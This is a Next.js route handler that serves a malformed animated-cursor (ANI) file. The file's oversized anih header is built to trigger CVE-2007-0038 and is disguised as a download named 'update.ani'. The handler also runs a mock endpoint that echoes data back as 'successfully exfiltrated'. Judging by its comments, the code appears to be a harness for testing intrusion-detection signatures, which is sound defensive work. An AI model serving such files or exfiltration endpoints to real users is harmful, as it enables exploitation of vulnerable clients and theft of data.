import { NextResponse } from 'next/server';

export async function GET(request: Request) {
    const { searchParams } = new URL(request.url);
    const data = searchParams.get('data');
    const type = searchParams.get('type');

    const headers: Record<string, string> = { 'Cache-Control': 'no-store, no-cache, must-revalidate' };

    // Malicious ANI (animated cursor) file with buffer overflow exploit
    // Targets: File-RIFF_Ani-Windows-Animationheader-Length-Buffer-Overflow (Compromise - 1st Class)
    // RIFF/ACON container with malformed anih chunk length triggers CVE-2007-0038 detection
    if (type === 'ani-exploit') {
        const ani = new Uint8Array([
            // RIFF header
            0x52, 0x49, 0x46, 0x46, // "RIFF"
            0x48, 0x01, 0x00, 0x00, // File size (328 bytes)
            0x41, 0x43, 0x4F, 0x4E, // "ACON" (animated cursor)
            // anih chunk - animation header
            0x61, 0x6E, 0x69, 0x68, // "anih"
            0x58, 0x01, 0x00, 0x00, // Chunk size: 0x158 (344) — MALFORMED, should be 0x24 (36)
            // anih data with oversized ih_size to trigger buffer overflow
            0x58, 0x01, 0x00, 0x00, // ih_size: 0x158 (overflow trigger)
            0x02, 0x00, 0x00, 0x00, // num_frames: 2
            0x00, 0x00, 0x00, 0x00, // num_steps: 0
            0x00, 0x00, 0x00, 0x00, // cx: 0
            0x00, 0x00, 0x00, 0x00, // cy: 0
            0x00, 0x00, 0x00, 0x00, // bit_count: 0
            0x00, 0x00, 0x00, 0x00, // num_planes: 0
            0x0A, 0x00, 0x00, 0x00, // display_rate: 10
            0x01, 0x00, 0x00, 0x00, // flags: AF_ICON
            // Overflow padding data (simulated exploit payload)
            ...Array(256).fill(0x41), // NOP sled / padding
        ]);

        return new NextResponse(ani, {
            status: 200,
            headers: {
                ...headers,
                'Content-Type': 'application/octet-stream',
                'Content-Disposition': 'attachment; filename="update.ani"',
            },
        });
    }

    // Default: JSON exfiltration response
    if (data) {
        return NextResponse.json({
            status: 'success',
            message: 'Data successfully exfiltrated',
            data_received: data
        }, { status: 200, headers });
    }

    return NextResponse.json({ error: 'No data provided' }, { status: 400, headers });
}
